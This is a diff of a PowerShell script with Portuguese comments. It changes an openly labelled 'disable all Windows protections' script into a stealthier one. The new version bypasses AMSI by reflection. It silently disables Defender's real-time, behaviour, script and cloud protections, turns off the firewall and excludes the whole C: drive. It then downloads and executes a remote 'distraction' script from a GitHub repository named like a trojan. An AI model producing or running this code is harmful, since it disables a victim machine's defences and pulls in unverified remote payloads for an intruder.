@@ -1,51 +1,26 @@
-<#
-.SYNOPSIS
-    Desativa todas as proteções do Windows Defender + Firewall + Exclusão C:\.
-.NOTES
-    Execute como Administrador.
-#>
+# ---------- AMSI BYPASS (método do artigo) ----------
+$a = 'System.Management.Automation.A'
+$b = 'msiUtils'
+$c = [Ref].Assembly.GetType($a+$b)
+$d = $c.GetField('amsiInitFailed','NonPublic,Static')
+$d.SetValue($null,$true)
 
-#Requires -RunAsAdministrator
+# ---------- Desativações (opcional, pode comentar se não quiser) ----------
+Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
+Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
+Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
+Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
+Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
+Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
+netsh advfirewall set allprofiles state off
 
-Write-Host "[*] Iniciando desativação total das defesas..." -ForegroundColor Cyan
-
-# ---------- 1. Exclusão do disco C ----------
-Write-Host "[1] Adicionando exclusão do C:\..."
+# ---------- Exclusão do C:\ ----------
 $drive = [char]67 + ':\'
 Add-MpPreference -ExclusionPath $drive -ErrorAction SilentlyContinue
-Write-Host "    Caminho excluído: $drive"
 
-# ---------- 2. Proteção em tempo real ----------
-Write-Host "[2] Desativando proteção em tempo real..."
-Set-MpPreference -DisableRealtimeMonitoring $true
-Write-Host "    Desativada."
+# ---------- DISTRAÇÃO automática ----------
+Write-Host "[*] Executando distração..."
+iex (iwr -Uri 'https://raw.githubusercontent.com/gsfv/tro.j/refs/heads/main/DISTRACTION.ps1' -UseBasicParsing).Content
 
-# ---------- 3. Proteção fornecida na nuvem (MAPS + Bloqueio à primeira vista) ----------
-Write-Host "[3] Desativando proteção na nuvem..."
-Set-MpPreference -MAPSReporting 0               # 0 = Desabilitado (sem envio, sem nuvem)
-Set-MpPreference -DisableBlockAtFirstSeen $true # Desabilita bloqueio imediato (primeira vista)
-Write-Host "    Proteção na nuvem desativada."
-
-# ---------- 4. Envio automático de amostras ----------
-Write-Host "[4] Desativando envio automático de amostras..."
-Set-MpPreference -SubmitSamplesConsent 2         # 2 = Never send
-Write-Host "    Envio desativado."
-
-# ---------- 5. Proteção contra violações (Tamper Protection) ----------
-Write-Host "[5] Desativando proteção contra violações (via registro)..."
-$tamperPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
-New-Item -Path $tamperPath -Force | Out-Null
-Set-ItemProperty -Path $tamperPath -Name "TamperProtection" -Value 0 -Type DWord -Force
-Write-Host "    Registro alterado (0 = desativado). Pode exigir reboot."
-
-# ---------- 6. Proteção de unidade/dispositivos (IOAV) ----------
-Write-Host "[6] Desativando verificação de dispositivos..."
-Set-MpPreference -DisableIOAVProtection $true
-Write-Host "    Verificação de dispositivos desativada."
-
-# ---------- 7. Firewall ----------
-Write-Host "[7] Desligando Firewall do Windows..."
-netsh advfirewall set allprofiles state off > $null
-Write-Host "    Firewall desativado em todos os perfis."
-
-Write-Host "[+] Todas as defesas foram desativadas com sucesso." -ForegroundColor Green
+Write-Host "[+] AMSI bypass ativo. Janela pronta para novos comandos."
